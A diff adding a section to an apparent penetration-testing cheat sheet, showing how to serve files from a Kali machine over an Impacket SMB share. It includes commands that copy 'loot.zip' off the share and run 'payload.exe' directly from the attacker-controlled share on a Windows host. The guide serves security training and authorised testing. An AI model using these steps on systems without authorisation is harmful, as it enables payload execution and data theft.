@@ -169,6 +169,46 @@ If you are seeing a 421 timeout when you try to send a command it is likely beca
 
 You can check to see if the remote machine has Winscp.exe installed. Winscp is capable of connecting to an FTP server using passive mode and will not be blocked by the firewall.
 
+### Transfering Files via SMB using Impacket
+Kali comes loade with the incredible Impacket library which is a swiss army knife of network protocols... just Awesome.  You can easily create a SMB share on your local Kali machine and move files between Kali and Windows with ease.  
+https://github.com/SecureAuthCorp/impacket  
+
+First we will setup the SMB Share on Kali like so:
+```
+root@kali:~/smbshare# python /usr/local/bin/smbserver.py -smb2support smbshare ./
+Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+                                                                    
+```
+Confirm it is up and running using Net View on the Windows command line:
+```
+C:\Users\Null>net view \\192.168.0.49
+Shared resources at \\192.168.0.49
+
+(null)
+
+Share name  Type  Used as  Comment
+
+-------------------------------------------------------------------------------
+smbshare    Disk
+The command completed successfully.
+```
+Then we can trasnfer files from the command line as if it were a normal folder:  
+```
+C:\Users\Admin>dir \\192.168.0.49\smbshare 
+C:\Users\Admin>copy \\192.168.0.49\smbshare\loot.zip .  
+```
+By far the most interesting feature of the SMB Share method is that you can execute files directly over the SMB Share without copying them to the remote machine (fileless execution is so hot right now):
+```
+C:\Users\Admin>\\192.168.0.49\smbshare\payload.exe
+```
+ 
 ## Upgrading your Windows Shell
 You might find that you are connected with a limited shell such as a Web shell, netcat shell or Telnet connection that simply is not cutting it for you. Here are a few oneliners you can use to upgrade your shell:
 
@@ -557,5 +597,5 @@ https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
 https://github.com/GhostPack/Seatbelt  
 https://github.com/rasta-mouse/Watson
 http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html  
-
+https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb  
 
